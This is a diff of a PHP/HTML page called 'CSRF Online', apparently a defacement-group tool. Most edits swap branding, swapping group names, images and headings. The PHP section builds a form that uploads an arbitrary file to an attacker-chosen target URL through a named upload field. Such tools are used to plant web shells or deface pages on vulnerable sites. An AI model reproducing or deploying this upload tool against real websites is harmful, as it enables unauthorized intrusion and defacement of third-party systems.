@@ -3,9 +3,9 @@
  <head> 
   <title>CSRF Online</title> 
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
-  <meta content="MR'AGZ69" name="description"> 
-  <meta content="MR'AGZ69" name="keywords"> 
-  <meta property="og:image" content="https://i.ibb.co/hCPjQ48/me.jpg" "="">
+  <meta content="RINKA" name="description"> 
+  <meta content="RINKA" name="keywords"> 
+  <meta property="og:image" content="https://ibb.co/wybYYz7/IMG-20210205-WA0000" "="">
      <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
   <link href="https://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css">
   <link href="https://fonts.googleapis.com/css?family=Rancho" rel="stylesheet" type="text/css">
@@ -19,7 +19,7 @@
          <meta content='CSRF Online' name='keywords'/>
          <meta content='CSRF Online' name='Abstract'/>
          <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
-          <link rel="icon" type="image/png" href="https://cdn.pixabay.com/photo/2013/07/13/13/41/bash-161382_960_720.png">
+          <link rel="icon" type="image/png" href="https://i.ibb.co/DMxQQWQ/IMG-20210205-WA0000-jpg.jpg">
              
   <style>body {		background: linear-gradient(to right bottom, #B721FF, #2AF598, #fec051, #FEE140, #FA709A );	background-size: cover;	background-repeat: repeat;}
 body:before{	content:'';	position: center;	top: 0;	bottom: 0;	width: 100%;	z-index: -5;	background: linear-gradient(to bottom, rgba(255,255,255,0.7), #21D4FD 10%); display:block;}
@@ -38,13 +38,13 @@ color: white;}
 @-webkit-keyframes blinker { 0% { opacity: 1.0; } 50% { opacity: 0.0; } 100% { opacity: 1.0; } }
 @keyframes blinker { 0% { opacity: 1.0; } 50% { opacity: 0.0; } 100% { opacity: 1.0; } }.njedul {	-webkit-animation: njedul 3s cubic-bezier(0.215, 0.610, 0.355, 1.000) both;	 animation: njedul 15s cubic-bezier(0.215, 0.610, 0.355, 1.000) both;}@-webkit-keyframes njedul { 0% { letter-spacing: 1em; -webkit-transform: translateZ(400px) translateY(300px); transform: translateZ(400px) translateY(300px); opacity: 0; } 10% { opacity: 0.1;} 20% { opacity: 0.2;} 30% { opacity: 0.3;} 40% { opacity: 0.4;} 50% { opacity: 0.5;} 60% { opacity: 0.6;} 70% { opacity: 0.7;} 80% { opacity: 0.8;} 90% { opacity: 0.9;} } 100% { -webkit-transform: translateZ(0) translateY(0); transform: translateZ(0) translateY(0); opacity: 1; }}@keyframes njedul { 0% { letter-spacing: 1em; -webkit-transform: translateZ(400px) translateY(300px); transform: translateZ(400px) translateY(300px); opacity: 0; } 40% { opacity: 0.6; } 100% { -webkit-transform: translateZ(0) translateY(0); transform: translateZ(0) translateY(0); opacity: 1; }}</style>
  </head> 
- <!--MR'AGZ69-->
+ <!--RINKA-->
  <body>
   <div class="container">
    <main>
     <center>
      <hr>
-     <font face="Rancho"><h1 class="njedul" style="margin:0; font-size:120px; line-height:250px; font-weight:bold;">PUNTEN:V</h1></font>
+     <font face="Rancho"><h1 class="njedul" style="margin:0; font-size:120px; line-height:250px; font-weight:bold;">GG LU BANG</h1></font>
      <marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
       <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
      </marquee>
@@ -54,7 +54,7 @@ color: white;}
      <header>
       <font size="7pz" face="Rancho"> 
        <div class="content" data-text="FUCKED">
-       Muslim Cyber Army
+       Wagashi Wibu:v
        </div></font>
      </header>
      <br>
@@ -64,7 +64,7 @@ color: white;}
      <br>
      <marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
           <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
-         </marquee><br><img src="https://i.ibb.co/BV58HmG/IMG-20200425-005620.png"><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
+         </marquee><br><img src="https://i.ibb.co/DMxQQWQ/IMG-20210205-WA0000-jpg.jpg"><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
           <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
          </marquee>
      <br>
@@ -73,7 +73,7 @@ color: white;}
                                <span style="font-family: monospace;"></head>
                                <center> 
                                <div class="error">
-                                  <img src="https://i.ibb.co/LYJHp70/20200326-181432.png" height="250px" width="250px">Feat</font><img src="https://i.ibb.co/hCPjQ48/me.jpg" width="250px" height="250px"><br><progress></progress>
+                                  <img src="https://ibb.co/wybYYz7/IMG-20210205-WA0000" height="250px" width="250px">Feat</font><img src="https://i.ibb.co/hCPjQ48/me.jpg" width="250px" height="250px"><br><progress></progress>
                                      <br>
 									 <audio autoplay="autoplay" controls="controls" src="https://e.top4top.io/m_15650pw650.mp3" type="audio/mpeg"></audio>
 									 <br>
@@ -113,7 +113,7 @@ if($d) {
     echo " </div> </div> ";
     echo " <div class='content'> ";
     echo " </div> ";
-	echo "<img src='https://i.ibb.co/LYJHp70/20200326-181432.png' style='width: 120px; height: 80px';>";
+	echo "<img src='https://ibb.co/wybYYz7/IMG-20210205-WA0000' style='width: 120px; height: 80px';>";
 	echo "<br>";
         echo " <font face='Inconsolata' color='AQUA'> $url  Status -> </font> <font face='Inconsolata' color='green'> Locked </font> ";
         echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><font face='Inconsolata' color='white'> Filename : </font><font color=black>&#1203;&#824;&#1202;&#824;&#1203;</font><input type='file' name='$pf'><input type='submit' name='submit' value=' Gasken!!!' class='login-input' style='width: 120px; height: 42px;'></form";
